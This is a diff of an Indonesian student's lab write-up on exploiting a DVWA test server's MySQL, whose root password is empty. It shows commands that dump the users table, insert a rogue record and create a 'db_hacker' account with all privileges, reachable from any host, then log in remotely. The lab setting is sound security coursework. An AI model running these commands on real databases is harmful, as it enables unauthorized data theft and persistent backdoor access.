@@ -68,11 +68,55 @@ Dimas Hirda P | 5114100147
   
   dari situ terlihat username "root" dan passwordnya kosong
   
-  #### 11. Uji coba dengan melakukan manipulasi database
+  #### 11. Uji coba dengan melakukan manipulasi database dvws
   
-  ##### 1.  Melihat isi databases
+  ##### Melihat list database
   ```sql
-  show databases;
+  echo "show databases;" | mysql -u root;
   ```
+  ##### Melihat tabel dari database
+  ```sql
+  echo "use dvwa; show tables;" | mysql -u root
+  ```
+  ##### Menjalankan query
+  ```sql
+  echo "select * from dvwa.users;" | mysql -u root
+  ```
+  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/explore%20databases.PNG)
+  
+  ##### Memasukkan data baru
+  ```sql
+  echo "insert into dvwa.users values('7','Faiq','Firdausy','shinigami',
+  MD5('123'), 'NA');" | mysql -u root
+  ```
+  Syntax yang digunakan layaknya sql pada umumnya.
+  
+  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/insert.PNG)
+  
+  terlihat data yang dimasukkan melalui metasploit ada di record terakhir.
+  
+  #### 12. Uji coba mysql
+  
+  ##### Membuat user baru Mysql
+  ```sql
+  echo "use mysql; GRANT ALL PRIVILEGES ON *.* TO 'db_hacker'@'%'
+  IDENTIFIED BY 'abc123' WITH GRANT OPTION;" | mysql -u root
+  ```
+  Command tersebut akan membuat user baru yang memiliki segala privileges dan membuat kita
+  dapat mengakses darimanapun dan kapanpun
+  
+  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/add%20db_hacker.PNG)
+  
+  ##### Pembuktian dengan mengakses mysql di host dvwa melalui terminal baru
+  
+  ```sql
+  mysql -u db_hacker -h 192.168.1.32 -p
+  ```
+  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/login%20db_hacker.PNG)  
+  
+  setelah berhasil login, coba untuk melihat database.
+  
+  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%204/show%20databases%20db_hacker.PNG)
+  
   
   
